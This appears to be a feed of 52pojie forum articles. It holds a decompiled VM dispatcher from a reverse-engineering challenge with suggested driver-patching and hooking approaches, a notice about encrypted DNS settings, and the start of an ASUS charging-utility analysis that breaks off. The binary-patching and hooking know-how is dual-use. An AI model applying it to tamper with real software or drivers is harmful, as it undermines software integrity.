v19; <span style="color: rgb(124, 124, 124);">// rcx</span><br />    __int32 v20; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int32 v21; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int32 v22; <span style="color: rgb(124, 124, 124);">// eax</span><br />    __int64 result; <span style="color: rgb(124, 124, 124);">// rax</span><br />    memset(Stack,<span style="color: rgb(255, 115, 253);">0</span>,sizeof(Stack));<br />    Stack[<span style="color: rgb(255, 115, 253);">8</span>] = <span style="color: rgb(255, 115, 253);">50</span>;<br />    Stack[<span style="color: rgb(255, 115, 253);">9</span>] = <span style="color: rgb(255, 115, 253);">50</span>;<br />    <span style="color: rgb(150, 203, 254);">do</span><br />    {<br />        v10 = RIP_S;<br />        opcode = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />        <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">int</span>)opcode &gt; (<span style="color: rgb(255, 255, 182);">int</span>)<span style="color: rgb(255, 115, 253);">0x9A8ECD52</span> )<br />        {<br />            <span style="color: rgb(150, 203, 254);">switch</span> ( opcode )<br />            {<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xEE2362FC</span>:<br />                    ++RIP_S;<br />                    v21 = Stack[<span style="color: rgb(255, 115, 253);">0</span>];<br />                    v22 = Stack[<span style="color: rgb(255, 115, 253);">0</span>] * (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + <span style="color: rgb(255, 115, 253);">1</span>);<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] ^ <span style="color: rgb(255, 115, 253);">0x414345</span>;<br />                    Stack[<span style="color: rgb(255, 115, 253);">1</span>] = (Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v21)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (v21 * Stack[<span style="color: rgb(255, 115, 253);">1</span>])) % <span style="color: rgb(255, 115, 253);">256</span> + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v22)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xEE69524A</span>:<br />                    v19 = <span style="color: rgb(255, 115, 253);">0</span>;<br />                    v20 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( RIP_S != <span style="color: rgb(255, 115, 253);">1</span> )<br />                    {<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[v19 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v20;<br />                            ++v19;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v19 &lt; RIP_S - <span style="color: rgb(255, 115, 253);">1</span> );<br />                    }<br />                    ++RIP_S;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xFF4578AE</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    v16 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    v17 = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( v16 )<br />                    {<br />                        v18 = RIP_S;<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[++v18 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v17;<br />                            v17 = code[v18 + <span style="color: rgb(255, 115, 253);">271</span>] + <span style="color: rgb(255, 115, 253);">305419896</span> * v17;<br />                            --v16;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v16 );<br />                    }<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x1132EADF</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    Stack[code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>]] = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">default</span>:<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( opcode == <span style="color: rgb(255, 115, 253);">2018683631</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">272</span>] == <span style="color: rgb(255, 115, 253);">-295083446</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">273</span>] == <span style="color: rgb(255, 115, 253);">1755241482</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">274</span>] == <span style="color: rgb(255, 115, 253);">-1729111095</span> )<br />                        printf(<span style="color: rgb(168, 255, 96);">"call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>], Stack[<span style="color: rgb(255, 115, 253);">5</span>], Stack[<span style="color: rgb(255, 115, 253);">6</span>], Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            <span style="color: rgb(150, 203, 254);">switch</span> ( opcode )<br />            {<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9A8ECD52</span>:<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] -= Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x88659264</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    v12 = RIP_S;<br />                    v13 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    v14 = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    v15 = v13;<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( v13 )<br />                    {<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[++v12 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v14;<br />                            --v15;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v15 );<br />                    }<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x89657EAD</span>:<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] += Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x8E7CADF2</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    Stack[code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>]] = Stack[code[v10 + <span style="color: rgb(255, 115, 253);">273</span>]];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9645AAED</span>:<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( code[<span style="color: rgb(255, 115, 253);">272</span>] == <span style="color: rgb(255, 115, 253);">0xEE69624A</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">273</span>] == <span style="color: rgb(255, 115, 253);">0x689EDC0A</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">274</span>] == <span style="color: rgb(255, 115, 253);">0x98EFDBC9</span> )<br />                        printf(<span style="color: rgb(168, 255, 96);">"call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>], Stack[<span style="color: rgb(255, 115, 253);">5</span>], Stack[<span style="color: rgb(255, 115, 253);">6</span>], Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9645AEDC</span>:<br />                    RIP_S = <span style="color: rgb(255, 115, 253);">0x671</span>;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        result = <span style="color: rgb(255, 115, 253);">0x671</span>;<br />        ++RIP_S;<br />    }<br />    <span style="color: rgb(150, 203, 254);">while</span> ( RIP_S &lt; <span style="color: rgb(255, 115, 253);">0x671</span> );<br />}</code></pre><p>对比起来这个虚拟机的流程也是更大更难去分析了，但是根据已有的资料看来，似乎出的问题与初赛一致，最好的办法就是做 hook 然后替换坐标。据说决赛是卷方法数，当然其他的方法也可以有，这里可以说一些理论可行的方案：</p><ul><li style="margin-left: 2px;"><p>自己生成正确的指令流，直接PATCH SYS 文件。</p></li><li style="margin-left: 2px;"><p>等代码注入完成之后，搜索指令的特征码找到三环程序中代码的位置，替换（感觉和上面算一种）。</p></li><li style="margin-left: 2px;"><p>hook 绘制的代码，写入正确坐标。</p></li><li style="margin-left: 2px;"><p>不用虚拟机，自己接管流程，然后自己计算正确的坐标和加密的参数调用绘制函数。</p></li><li style="margin-left: 2px;"><p>不知道它代码坐标计算出错的原因，如果是逻辑错误可以直接修虚拟机，也能算一种。</p></li></ul><p>脑子有限，只能想那么多了，希望有时间那个旧电脑退役了刷个系统再去实现这些操作把。</p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904205-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 25 Mar 2024 18:17:09 +0800</pubDate>
<pubDate>Mon, 25 Mar 2024 18:17:09 +0800</pubDate>
</item>
<item>
<title>【公告】关于论坛验证码无法显示的问题解决方法</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140318&amp;idx=1&amp;sn=e77d522f3ced943e26ef4c5a0b2570e8&amp;chksm=bd50a08a8a27299ca62f961c28c942e9c0665749abd118ec1b99fa8c3ff67874b4e86dbd60a0&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140318&amp;idx=1&amp;sn=e77d522f3ced943e26ef4c5a0b2570e8&amp;chksm=bd50a08a8a27299ca62f961c28c942e9c0665749abd118ec1b99fa8c3ff67874b4e86dbd60a0&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 🔍DNS解析错误导致部分同学无法显示验证码，建议使用加密DNS进行网络访问，减少网络劫持的发生。<br>
🖥️推荐国内加密DNS：阿里加密DNS和腾讯加密DNS。<br>
🌐设置浏览器加密DNS方法：<br>
Microsoft Edge、Google Chrome、360极速浏览器X、Firefox火狐浏览器分别有不同步骤。<br>
Windows 11系统支持加密DNS设置，其他老系统推荐使用浏览器设置方式。<br>
📱手机系统和浏览器根据设备和浏览器信息进行加密DNS设置。<br>
💡建议绑定QQ，使用QQ登录可免除验证码问题。后期将启用新验证码机制，加强用户体验。<br>
ℹ️更多问题解决方案和公告请关注官方论坛www.52pojie.cn。<br> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-20 16:50</span> <span style="display: inline-block;">北京</span>
</p>

<p>近期收到部分同学反馈，登录论坛无法显示验证码，经过远程诊断分析发现都是DNS解析错误导致的，我们强烈推荐电脑浏览器使用加密DNS进行网络访问，减少网络劫持的发生。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=6cc91a9e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupxjicDOnINJbyOsGNgibWttfqaBhX7ibMG8knT0DwrTIKGDTNib6N4okhDg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 20px;"><span style="font-size: 20px; letter-spacing: 0.034em;"><span style="color: rgb(47, 50, 56); font-family: Helvetica, Arial, sans-serif; letter-spacing: normal; background-color: rgb(255, 255, 255);">近期收到部分同学反馈，登录论坛无法显示验证码，经过远程诊断分析发现都是DNS解析错误导致的，</span><span>我们强烈推荐电脑浏览器使用</span></span><span>加密DNS进行网络访问，减少网络劫持的发生，国内推荐：</span></span><br /></p><p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 14px;"><span></span></span></p><p style="margin-bottom: 0px; line-height: normal;"><span style="font-size: 14px;"><span>阿里加密DNS：</span><br /><span>https://dns.alidns.com/dns-query</span><br /><span>腾讯加密DNS：</span><br /><span>https://doh.pub/dns-query</span></span></p><p style="margin-bottom: 0px; line-height: normal;"><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>一：在浏览器中设置加密DNS方法</span><span style="font-size: 15px;"><br /><br /><span>Microsoft Edge浏览器</span><br /><span>步骤：</span><br /><span>1、打开Edge -- “设置” -- ”隐私、搜索和服务“ -- 开启“</span><span>使用安全的 DNS 指定如何查找网站的网络地址</span><span>”功能。</span><br /><span>2、选择”</span><span>请选择服务提供商</span><span>“，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ab5943ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupuiczEMpnAhn1BX0jPQZQ7zb2tjf0xKDvZb7YQ3aclbh54eOGM3AdGeg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>Google Chrome浏览器</span><br /><span>步骤：</span><br /><span>1、打开Chrome --  ”设置“ -- ”隐私和安全“ -- ”安全“ -- 找到”对您访问的网站的名称进行加密“并开启。</span><br /><span>2、然后在”选择 DNS 提供商“右层勾选选择”添加自定义 DNS 服务提供商“ ，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9cd48f0d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupL4zuiabrgibcd3akua3mumEfV4ZrYmNcts3ywllXVibf6UeB4avbtVupg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>360 极速浏览器X</span><br /><span>步骤：</span><br /><span>1、打开360 极速浏览器X -- ”设置“ -- 搜索”DNS“。</span><br /><span>2、点击”开启DNS安全解析“，在”使用自定义网址“中填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a149bbf6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupplQeABWGXgcibo63aZpKvBx2Pn8AS5XbMatFC9rKJGl0fZKgL0LyyZg%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span style="font-size: 15px;"><span>Firefox火狐浏览器</span><br /><span>步骤：</span><br /><span>1、打开火狐浏览器 -- ”设置“ -- 搜索”DNS“ -- 找到”安全 DNS 启用策略“。</span><br /><span>2、点击”增强保护“，在”选择提供方“中选择”自定义“，然后填入国内加密DNS地址，推荐阿里或者腾讯的，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=29b99ab4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJupj1icw7LvqcgdyKQ1cSbz7yTCLxuta7J8J9IE42MEticR2jS8KaG0wGXQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span>其他浏览器应该都有类似功能，直接设置中搜索”DNS“即可找到，按照上面方法设置即可，<span style="font-weight: 700;">设置完记得重启浏览器</span>。<br /><br /></span><span><span>二、使用Windows 11操作系统，系统本身支持加密DNS设置</span>，其他老系统无法直接支持，推荐上面浏览器设置的方式。</span><span style="font-size: 15px;"><br /><span>步骤：</span><br /><span>1、打开“网络和Internet”设置，点击“以太网”，编辑“DNS服务器分配”，开启手动编辑IPv4的加密DNS，如图所示：</span><br /></span></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ae2e701a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKa600S04jLEXaDqvylNJup6jPsfzfDNhmSNH6g0pTOqxRicp9tfbqXenz6bkiclKEVnJFmuFmnQ8EQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p style="margin-bottom: 0px; line-height: normal;"><br /><span>2、保存后重启浏览器即可，如果过程不够详细请自行在网络搜索”Windows 11 DOH 设置“进行学习。<br /><br /></span><span>三、手机系统和手机浏览器请自行根据设备和浏览器信息在网络搜索”设备名称 加密DNS“、”浏览器名称 DOH 设置“方法来解决，由于品牌和方法不通用本文不再赘述。</span></p><p style="margin-bottom: 0px; line-height: normal;"><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><span>更多问题解决方案详见左下角”阅读原文“。</span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><strong><span>建议大家可以绑定QQ，使用QQ登录可以免除验证码问题。</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><strong><span>后期我们将启用新的验证码机制，加强用户体验。</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-98585-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 20 Mar 2024 16:50:19 +0800</pubDate>
<pubDate>Wed, 20 Mar 2024 16:50:19 +0800</pubDate>
</item>
<item>
<title>华硕fx63vd7700充电保护程序“ASUS Battery Health Charging”逆向分析</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140308&amp;idx=1&amp;sn=97258089fd7ac9252b638ffc7e9fde7d&amp;chksm=bd50a0808a27299644a5f10d065b50f003660f6e057e5d5d6af238f63bb0c1c4d3b3a995e70c&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140308&amp;idx=1&amp;sn=97258089fd7ac9252b638ffc7e9fde7d&amp;chksm=bd50a0808a27299644a5f10d065b50f003660f6e057e5d5d6af238f63bb0c1c4d3b3a995e70c&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 1. 作者对华硕飞行堡垒fx63vd7700型号的充电保护程序进行了分析，发现可以控制最高充电百分比。<br>
2. 该充电保护程序有三种模式：完整充电模式、平衡保养模式、最佳保养模式，分别限制充电百分比为100%、80%和60%。<br>
3. 通过动态调试和静态分析，作者发现DeviceIoControl函数用于和设备通信，并结构体中的perecent字段可以控制充电百分比。<br>
4. 作者通过C++代码复现了控制笔记本最高充电百分比的方法，可以修改为60%、80%和100%这三种数值，其他数值会默认为100%。<br>
5. 作者提供了代码和操作步骤，可以自行尝试修改最高充电百分比。<br>
6. 对于其他品牌或型号的笔记本电脑，该充电保护程序不适用。<br> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-19 16:10</span> <span style="display: inline-block;">北京</span>
</p>

<p>最近好奇这个充电保护程序为什么可以控制最高充电百分比，所以我想分析一下。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=284c2aa3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPficsjPQoYJn1Wo1aDTKqlpyecicN35EWe4UA5HJmmElwqic7qUmBlxXSZw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; margin-top: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>SNSD99</strong></p><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><p style="margin-bottom: 0px; margin-top: 0px;"><span>0.前言</span><br /><span>最近好奇这个充电保护程序为什么可以控制最高充电百分比，所以我想分析一下。</span><br /><span>该程序适用于华硕飞行堡垒fx63vd7700型号，如果适用华硕其它型号的可以试试看。</span><br /><span>注意该充电保护程序不适用于其它品牌、或华硕其它型号的笔记本电脑。</span><br /><span>这个软件的界面如下图所示。</span><br /><span>模式有三种：完整充电模式、平衡保养模式、最佳保养模式。三种模式限制充电百分比分别为100%，80%、和60%。</span><br /><img class="rich_pages wxw-img" height="550" src="https://https://wechat2rss.xlab.app/img-proxy/?k=710fb399&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfOjR4nLHo1d5rQy5O34grynMzl9MhdCEok25YnyunQL0iaCsaMX3Aiaog%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="800" /><br /><br /><span>目录如下：</span><br /><img class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6b2845e9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJIL3QlPmvYWgKbkfia33VPfcYCyjpwpVp7uPsx3iaCpCh0bMpHj0QmDJPxqOyOoOqtuLP4G1l08PQQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="645" /><br /><br /><span>1.x64dbg动态调试</span><br 